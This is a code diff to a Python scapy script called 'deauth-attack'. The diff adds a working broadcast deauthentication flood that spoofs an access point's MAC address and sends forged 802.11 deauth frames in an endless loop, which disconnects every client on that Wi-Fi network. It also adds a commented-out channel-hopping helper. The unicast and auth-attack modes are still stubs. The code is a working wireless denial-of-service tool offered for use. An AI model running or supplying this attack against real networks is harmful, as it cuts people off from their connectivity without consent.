@@ -1,24 +1,51 @@
 import argparse
 from scapy.all import *
 import sys
+import os
 import random
 import threading
+import time
 
-def Ap_Broadcast():
+def Ap_Broadcast(argu):
+    dot11 = Dot11(type=0, subtype=12, addr1="ff:ff:ff:ff:ff:ff",addr2=argu[1], addr3=argu[1])
+    frame = RadioTap()/dot11/Dot11Deauth(reason=7)
+    sendp(frame, iface=argu[0], inter=0.01, loop=1)
+
+def Ap_Unicast(argu):
+    print(argu)
     return 0
 
-def Ap_Unicast():
+def Auth_Attack(argu):
+    print(argu)
     return 0
 
-def Auth_Attack():
-    return 0
+'''
+def Hopping(args):
+    ch = 0
+    while(1):
+        ch = (ch % 14 ) +1
+        x= "sudo iwconfig "+args[0]+" channel " + str(ch)
+        os.system(x)
+        print(x)
+        time.sleep(0.1)
+'''
 
 if __name__ == '__main__':
 
-    argument = sys.argv
-    del argument[0]
-    print(f'Argument : {argument}')
+    argu = sys.argv
+    del argu[0]
+    print(f'Argument : {argu}')
 
-    if len(argument) < 2:
+    argu_len = len(argu)
+    
+    #threading.Thread(target=Hopping, args=(argu,)).start()
+    
+    if argu_len == 2:
+        Ap_Broadcast(argu)
+    elif argu_len == 3:
+        Ap_Unicast(argu)
+    elif argu_len == 4:
+        Auth_Attack(argu)
+    else:
         print("syntax : deauth-attack <interface> <ap mac> [<station mac> [-auth]]\nsample : deauth-attack mon0 00:11:22:33:44:55 66:77:88:99:AA:BB")
         quit()
